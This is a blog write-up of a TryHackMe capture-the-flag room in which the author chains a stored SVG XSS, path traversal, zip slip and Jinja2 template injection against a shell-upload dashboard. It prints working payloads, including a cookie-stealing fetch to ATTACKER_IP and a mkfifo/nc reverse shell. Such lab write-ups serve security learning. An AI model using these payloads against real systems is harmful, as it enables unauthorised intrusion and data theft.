# TRYHACKME — THE HOLLOW SHELL

This room is a part of THM’s HackerHolidays 2026.

---

### TRYHACKME — THE HOLLOW SHELL

![](https://cdn-images-1.medium.com/max/800/1*iAKaljt9RLSvf1Q2JYj1OQ.png)

This room is a part of THM’s HackerHolidays 2026.

A concierge dashboard lets you upload themed “shells” (.zip files) to decorate the in-room tablets. Each shell needs a shell.json manifest and some assets.

Logged in as concierge and started poking at the upload form.

![](https://cdn-images-1.medium.com/max/800/1*ffvUNIsVWVqrZ6ZzF4nErQ.png)

The page mentions two things — allowed asset types (png jpg gif svg css json) and an “automation hooks” feature that supposedly runs after a shell is uploaded.

![](https://cdn-images-1.medium.com/max/800/1*Fosn7e6u77XemswSyutmDA.png)

Made a basic shell.zip with a shell.json and a test image just to see the upload flow work.

Tried nesting assets like `"assets": {"images": [...], "styles": [...]}` and got rejected. Server said assets must be a list, so it's just a flat array of filenames.

Also zipped the folder wrong the first time and got “Shell is missing shell.json” — turns out shell.json needs to be at the root of the zip, not inside a subfolder. Fixed by zipping the contents directly instead of the folder itself.

Once the manifest was right, moved on to testing the SVG upload since svg was in the allowed list.

![](https://cdn-images-1.medium.com/max/800/1*nyqiVHdCEdzc5nWqNYjVLA.png)

Uploaded an svg with an onload handler and an inline script pulling document.cookie to a listener :-

```
<svg xmlns="http://www.w3.org/2000/svg" onload="document.title='xss-poc'">  
  <script>fetch('http://ATTACKER_IP:3030/poc?c='+document.cookie)</script>  
</svg>
```

Navigated straight to the stored svg url and got a hit on my listener, confirming it executes. Checked and the response headers showed Content-Type: image/svg+xml with Content-Disposition: inline, so browsing to it directly renders it as a full document instead of downloading it.

document.cookie came back empty though — checked dev tools and the session cookie is HttpOnly, so no cookie theft here. XSS confirmed but no immediate impact from it alone.

Spent a good while after this trying to get the “automation hooks” feature to do anything. Tried a bunch of guesses for field names in shell.json — run, command, exec, cmd, script — with different event names too. Nothing ever errored, nothing ever fired on my listener. Got properly stuck here, no error message to work off of and no way to tell if hooks were even real.

Got a hint from someone on discord to try path traversal on the asset route instead of chasing hooks any further :-

```
curl -g --path-as-is "http://TARGET:5000/shells/..%2Fapp.py"
```

![](https://cdn-images-1.medium.com/max/800/1*aj8hNOSXtr4nNPEWby-zHQ.png)

Ran it and got the full source of app.py back. Big find. Turns out the shell\_id part of the url wasn’t validated at all before being joined into the file path, so passing `..` walks it out of the shells folder entirely.

Reading the source cleared a few things up:

- automation hooks isn’t a real feature, there’s no code for it anywhere. pure red herring in the UI text.
- the zip extraction function writes every file straight to disk using the raw name from the zip, no path sanitization at all — classic zip slip.
- /dashboard renders using render\_template on an actual dashboard.html file on disk.

Put those two together — if I can write anywhere I want via zip slip, and dashboard.html is a real Jinja2 template getting rendered server side, I can overwrite the template itself.

Built a zip with an entry named `../../templates/dashboard.html` containing just `{{7*7}}` to test :-

Uploaded it, reloaded the dashboard, and it showed 49 instead of the normal page. SSTI confirmed.

Swapped the payload for a proper RCE gadget piping into a reverse shell :-

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f').read() }}
```

![](https://cdn-images-1.medium.com/max/800/1*Umzh679GfnSMNc1m94DL9g.png)

Uploaded, reloaded the dashboard, and caught a shell on my nc listener straight away.

Stabilized with:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://cdn-images-1.medium.com/max/800/1*UQx4pV3xkCF6HI_B5H02dg.png)

Got the flag from there.

Thanks for reading!

By [Lightningfst](https://medium.com/@lightningfst8) on [August 6, 2026](https://medium.com/p/7fdc3bd06627).

[Canonical link](https://medium.com/@lightningfst8/tryhackme-shoreline-display-7fdc3bd06627)

Exported from [Medium](https://medium.com) on August 8, 2026.
